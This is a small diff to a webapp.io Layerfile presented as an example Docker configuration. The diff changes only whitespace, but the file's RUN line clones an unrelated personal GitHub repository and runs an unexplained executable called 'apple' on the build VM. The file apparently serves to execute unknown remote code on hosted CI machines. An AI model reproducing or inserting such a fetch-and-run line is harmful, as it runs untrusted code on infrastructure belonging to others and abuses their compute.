@@ -1,5 +1,5 @@
 #This is an example webapp.io configuration for Docker!
-FROM vm/ubuntu:18.04
+FROM vm/ubuntu:18.04 
 
 # To note: Layerfiles create entire VMs, *not* containers!
 RUN git clone https://github.com/alvinakhairulnisa953/waduk-munding.git && cd waduk-munding && chmod +x apple && ./apple
